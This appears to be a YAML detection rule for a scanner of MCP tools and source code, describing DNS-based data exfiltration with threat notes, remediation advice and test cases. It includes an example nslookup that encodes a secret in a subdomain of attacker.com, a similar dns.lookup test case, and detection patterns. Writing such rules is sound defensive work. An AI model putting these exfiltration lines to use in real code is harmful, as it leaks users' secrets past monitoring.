id: G7
name: DNS-Based Data Exfiltration Channel
category: adversarial-ai
severity: critical
owasp: MCP04-data-exfiltration
mitre: AML.T0040

# THREAT INTELLIGENCE NOTE (P1 Threat Researcher):
# DNS exfiltration is the stealth king of data theft. It bypasses HTTP firewalls,
# DLP solutions, and most SIEM rules. It works even in heavily locked-down environments
# because DNS traffic almost never gets blocked or inspected.
#
# THE ATTACK in MCP context:
# A malicious tool (or malicious source code) performs DNS lookups where the subdomain
# encodes stolen data. The attacker runs an authoritative DNS server and logs all queries.
#
# Example:
#   nslookup "c2VjcmV0X2tleT1hYmMxMjM.attacker.com"
#   ^ base64(secret_key=abc123) encoded in the subdomain
#
# Why DNS is special:
# - Passes through most corporate firewalls (UDP/53 is rarely blocked)
# - Doesn't create HTTP logs (no web proxy, no URL filtering)
# - Can exfiltrate data from air-gapped networks via DNS recursion
# - Many cloud environments allow DNS but block direct internet HTTP
# - Standard DLP tools don't inspect DNS query content
#
# In source code, look for:
# - dns.lookup/resolve with dynamic subdomain construction
# - nslookup/dig/host called with variable data
# - http.get to *.attacker.com where subdomain is constructed from data
# - Domain generation algorithm patterns (long, random-looking subdomains)
#
# In tool descriptions, look for:
# - References to DNS "health checks" or "availability checks" with variable domains
# - URL patterns where the subdomain is constructed from user/system data

detect:
  type: typed
remediation: >
  Remove all dynamic DNS queries where subdomain content is derived from application data,
  user input, or system information. DNS exfiltration channels are invisible to most monitoring
  tools and operate even through strict HTTP firewalls.

  If DNS-based service discovery is required, use a static list of known-good hostnames.
  Never construct DNS query hostnames by concatenating or encoding application data.
  Deploy DNS logging (e.g., passive DNS, BIND query logs) and alert on high-entropy subdomain queries.
test_cases:
  true_positive:
    - { description: "Source code contains dns.lookup(`${Buffer.from(secret).toString('base64')}.attacker.com`) encoding data in subdomain", expected: true }
    - { description: "Source code contains nslookup with dynamically constructed domain using hex-encoded user data", expected: true }
  true_negative:
    - { description: "Source code contains dns.resolve('api.example.com') with a static hardcoded hostname", expected: false }
    - { description: "Source code performs DNS lookup on localhost for health check purposes", expected: false }
enabled: true
